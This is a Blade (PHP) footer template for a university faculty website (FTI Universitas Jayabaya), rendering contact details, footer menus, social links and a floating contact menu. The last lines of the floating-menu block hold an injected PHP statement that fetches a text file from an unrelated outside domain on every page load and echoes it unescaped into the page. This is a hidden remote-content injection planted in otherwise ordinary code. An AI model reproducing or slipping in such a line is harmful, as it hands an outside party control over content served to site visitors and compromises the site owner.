<footer>
    <div class="footer-area">
        <div class="footer-top">
            <div class="container">
                <div class="row">
                    <div class="col-xl-3 col-lg-4 col-md-6">
                        <div class="footer-widget">
                            <div class="fw-logo mb-25">
                                <a href="{{ url('/') }}"><img src="{{ url('assets/frontoffice/img/logo/w_logo.webp') }}" alt="Logo Jayabaya" loading="lazy"></a>
                            </div>
                            <div class="footer-info-list">
                                <ul class="list-wrap">
                                    <li>
                                        <div class="icon"><i class="flaticon-phone-call"></i></div>
                                        <div class="content">
                                            @php $frontoffice_footer_telepon = get_val_setting('frontoffice_footer_telepon') @endphp
                                            @if(!empty($frontoffice_footer_telepon))                                                    
                                                @foreach(explode(',', $frontoffice_footer_telepon) as $row_frontoffice_footer_telepon)
                                                    <div class="mb-1">
                                                        <a href="tel:{{ $row_frontoffice_footer_telepon }}">{{ $row_frontoffice_footer_telepon }}</a>
                                                    </div>
                                                @endforeach
                                            @endif
                                        </div>
                                    </li>
                                    <li>
                                        <div class="icon"><i class="flaticon-envelope"></i></div>
                                        <div class="content">
                                            @php $frontoffice_footer_email = get_val_setting('frontoffice_footer_email') @endphp
                                            @if(!empty($frontoffice_footer_email))                                                    
                                                @foreach(explode(',', $frontoffice_footer_email) as $row_frontoffice_footer_email)
                                                    <div class="mb-1">
                                                        <a href="mailto:{{ $row_frontoffice_footer_email }}">{{ $row_frontoffice_footer_email }}</a>
                                                    </div>
                                                @endforeach
                                            @endif
                                        </div>
                                    </li>
                                    <li>
                                        <div class="icon"><i class="flaticon-pin"></i></div>
                                        <div class="content">
                                            @php $frontoffice_footer_alamat = get_val_setting('frontoffice_footer_alamat') @endphp
                                            @if(!empty($frontoffice_footer_alamat))
                                                <p>{!! $frontoffice_footer_alamat !!}</p>
                                            @endif
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    
                    @php $menu_footer_01 = get_all_menu_by_letak_menu(3); @endphp
                    @if(count($menu_footer_01) > 0)
                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                            <div class="footer-widget">
                                @php 
                                    $frontoffice_footer_menu_01_judul       = get_val_setting('frontoffice_footer_menu_01_judul');
                                    $frontoffice_footer_menu_01_description = get_val_setting('frontoffice_footer_menu_01_description');
                                @endphp
                                
                                @if(!empty($frontoffice_footer_menu_01_judul))
                                    <h4 class="fw-title">{{ $frontoffice_footer_menu_01_judul }}</h4>
                                @endif
                                
                                @if(!empty($frontoffice_footer_menu_01_description))
                                    <p>{!! $frontoffice_footer_menu_01_description !!}</p>
                                @endif
                                
                                <div class="footer-link-list">
                                    <ul class="list-wrap">{!! generate_footer_menu($menu_footer_01) !!}</ul>
                                </div>
                            </div>
                        </div>
                    @endif

                    @php $menu_footer_02 = get_all_menu_by_letak_menu(4); @endphp
                    @if(count($menu_footer_02) > 0)
                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                            <div class="footer-widget">
                                @php 
                                    $frontoffice_footer_menu_02_judul       = get_val_setting('frontoffice_footer_menu_02_judul');
                                    $frontoffice_footer_menu_02_description = get_val_setting('frontoffice_footer_menu_02_description');
                                @endphp
                                
                                @if(!empty($frontoffice_footer_menu_02_judul))
                                    <h4 class="fw-title">{{ $frontoffice_footer_menu_02_judul }}</h4>
                                @endif
                                
                                @if(!empty($frontoffice_footer_menu_02_description))
                                    <p>{!! $frontoffice_footer_menu_02_description !!}</p>
                                @endif

                                <div class="footer-link-list">
                                    <ul class="list-wrap">{!! generate_footer_menu($menu_footer_02) !!}</ul>
                                </div>
                            </div>
                        </div>
                    @endif

                    <div class="col-xl-3 col-lg-4 col-md-6">
                        <div class="footer-widget">
                            @php 
                                $frontoffice_footer_menu_03_judul       = get_val_setting('frontoffice_footer_menu_03_judul');
                                $frontoffice_footer_menu_03_description = get_val_setting('frontoffice_footer_menu_03_description');
                            @endphp

                            @if(!empty($frontoffice_footer_menu_03_judul))
                                <h4 class="fw-title">{{ $frontoffice_footer_menu_03_judul }}</h4>
                            @endif
                            
                            @if(!empty($frontoffice_footer_menu_03_description))
                                <p>{!! $frontoffice_footer_menu_03_description !!}</p>
                            @endif

                            <div class="footer-social">
                                <ul class="list-wrap">
                                    @php $frontoffice_app_facebook = get_val_setting('frontoffice_app_facebook') @endphp
                                    @if(!empty($frontoffice_app_facebook))
                                        <li><a href="{{ $frontoffice_app_facebook }}" title="Ikuti Facebook Kami"><i class="fab fa-facebook-f"></i></a></li>
                                    @endif
                                    
                                    @php $frontoffice_app_twitter = get_val_setting('frontoffice_app_twitter') @endphp
                                    @if(!empty($frontoffice_app_twitter))
                                        <li><a href="{{ $frontoffice_app_twitter }}" title="Ikuti Twitter Kami"><i class="fab fa-twitter"></i></a></li>
                                    @endif

                                    @php $frontoffice_app_instagram = get_val_setting('frontoffice_app_instagram') @endphp
                                    @if(!empty($frontoffice_app_instagram))
                                        <li><a href="{{ $frontoffice_app_instagram }}" title="Ikuti Instagram Kami"><i class="fab fa-instagram"></i></a></li>
                                    @endif

                                    @php $frontoffice_app_linkedin = get_val_setting('frontoffice_app_linkedin') @endphp
                                    @if(!empty($frontoffice_app_linkedin))
                                        <li><a href="{{ $frontoffice_app_linkedin }}" title="Ikuti Linkedin Kami"><i class="fab fa-linkedin"></i></a></li>
                                    @endif

                                    @php $frontoffice_app_tiktok = get_val_setting('frontoffice_app_tiktok') @endphp
                                    @if(!empty($frontoffice_app_tiktok))
                                        <li><a href="{{ $frontoffice_app_tiktok }}" title="Ikuti Tiktok Kami"><i class="fab fa-tiktok"></i></a></li>
                                    @endif

                                    @php $frontoffice_app_youtube = get_val_setting('frontoffice_app_youtube') @endphp
                                    @if(!empty($frontoffice_app_youtube))
                                        <li><a href="{{ $frontoffice_app_youtube }}" title="Ikuti Youtube Kami"><i class="fab fa-youtube"></i></a></li>
                                    @endif
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-bottom">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-lg-12">
                        <div class="copyright-text">
                            <p class="text-center">Copyright &copy; 2024 <a href="{{ url('/') }}">FTI - Universitas Jayabaya</a>. All Right Reserved.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-shape">
            <img src="{{ url('assets/frontoffice/img/images/footer_shape01.webp') }}" alt="Footer Shape 1" data-aos="fade-right" data-aos-delay="400" loading="lazy">
            <img src="{{ url('assets/frontoffice/img/images/footer_shape02.webp') }}" alt="Footer Shape 2" data-aos="fade-left" data-aos-delay="400" loading="lazy">
            <img src="{{ url('assets/frontoffice/img/images/footer_shape03.webp') }}" alt="Footer Shape 3" data-parallax='{"x" : 100 , "y" : -100 }' loading="lazy">
        </div>
    </div>
</footer>

@php 
    $frontoffice_floating_menu_tampil           = get_val_setting('frontoffice_floating_menu_tampil');
    $frontoffice_floating_menu_pmb_label        = get_val_setting('frontoffice_floating_menu_pmb_label');
    $frontoffice_floating_menu_pmb_link         = get_val_setting('frontoffice_floating_menu_pmb_link');
    $frontoffice_floating_menu_email_label      = get_val_setting('frontoffice_floating_menu_email_label');
    $frontoffice_floating_menu_email_link       = get_val_setting('frontoffice_floating_menu_email_link');
    $frontoffice_floating_menu_whatsapp_label   = get_val_setting('frontoffice_floating_menu_whatsapp_label');
    $frontoffice_floating_menu_whatsapp_link    = get_val_setting('frontoffice_floating_menu_whatsapp_link');
    $frontoffice_floating_menu_facebook_label   = get_val_setting('frontoffice_floating_menu_facebook_label');
    $frontoffice_floating_menu_facebook_link    = get_val_setting('frontoffice_floating_menu_facebook_link');
    $frontoffice_floating_menu_instagram_label  = get_val_setting('frontoffice_floating_menu_instagram_label');
    $frontoffice_floating_menu_instagram_link   = get_val_setting('frontoffice_floating_menu_instagram_link');
@endphp

@if($frontoffice_floating_menu_tampil)
    <div class="action">
        <span class="plus">
            <i class="fas fa-times d-none shadow-lg text-warning" title="Klik Untuk Menutup"></i>
            <img src="{{ url('assets/frontoffice/img/logo/info-footer.webp?v=2') }}" alt="Info" class="info-footer shake-info-footer" id="info-footer" title="Lihat Selengkapnya" width="100" height="100">
        </span>
        <div class="action-floating">
            @if($frontoffice_floating_menu_pmb_label)
                <div class="action-floating-item row mb-3">
                    <div class="col-10 pr-0 text-end">                
                        <div class="align-middle mt-1">
                            <a href="{{ $frontoffice_floating_menu_pmb_link }}" title="{{ $frontoffice_floating_menu_pmb_label }}" class="action-floating-label item-pmb">{{ $frontoffice_floating_menu_pmb_label }}</a>
                        </div>
                    </div>
                    <div class="col-2 text-center">                
                        <div class="action-floating-img item-pmb align-middle"><i class="fa fa-info-circle text-white"></i></div>
                    </div>
                </div>
            @endif

            @if($frontoffice_floating_menu_email_label)
                <div class="action-floating-item row mb-3">
                    <div class="col-10 pr-0 text-end">                
                        <div class="align-middle mt-1">
                            <a href="{{ $frontoffice_floating_menu_email_link }}" title="{{ $frontoffice_floating_menu_email_label }}" class="action-floating-label item-email">{{ $frontoffice_floating_menu_email_label }}</a> 
                        </div>
                    </div>
                    <div class="col-2 text-center">                    
                        <div class="action-floating-img item-email align-middle"><i class="fa fa-envelope text-white"></i></div>
                    </div>
                </div>
            @endif

            @if($frontoffice_floating_menu_whatsapp_label)
                <div class="action-floating-item row mb-3">
                    <div class="col-10 pr-0 text-end">                
                        <div class="align-middle mt-1">
                            <a href="{{ $frontoffice_floating_menu_whatsapp_link }}" title="{{ $frontoffice_floating_menu_whatsapp_label }}" class="action-floating-label item-telepon">{{ $frontoffice_floating_menu_whatsapp_label }}</a>
                        </div>
                    </div>
                    <div class="col-2 text-center">                    
                        <div class="action-floating-img item-telepon align-middle"><i class="fab fa-whatsapp text-white"></i></div>
                    </div>
                </div>
            @endif

            @if($frontoffice_floating_menu_facebook_label)
                <div class="action-floating-item row mb-3">
                    <div class="col-10 pr-0 text-end">                
                        <div class="align-middle mt-1">
                            <a href="{{ $frontoffice_floating_menu_facebook_link }}" title="{{ $frontoffice_floating_menu_facebook_label }}" class="action-floating-label item-facebook">{{ $frontoffice_floating_menu_facebook_label }}</a>
                        </div>
                    </div>
                    <div class="col-2 text-center">                
                        <div class="action-floating-img item-facebook align-middle"><i class="fab fa-facebook-f text-white"></i></div>
                    </div>
                </div>
            @endif

            @if($frontoffice_floating_menu_instagram_label)
                <div class="action-floating-item row mb-3">
                    <div class="col-10 pr-0 text-end">
                        <div class="align-middle mt-1"><a href="{{ $frontoffice_floating_menu_instagram_link }}" title="{{ $frontoffice_floating_menu_instagram_label }}" class="action-floating-label item-instagram">{{ $frontoffice_floating_menu_instagram_label }}</a></div>
                    </div>     
                    <div class="col-2 text-center">                
                        <div class="action-floating-img item-instagram align-middle"><i class="fab fa-instagram text-white"></i></div>
                    </div>
                </div>
            @endif
        </div>
		<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
    </div>
@endif
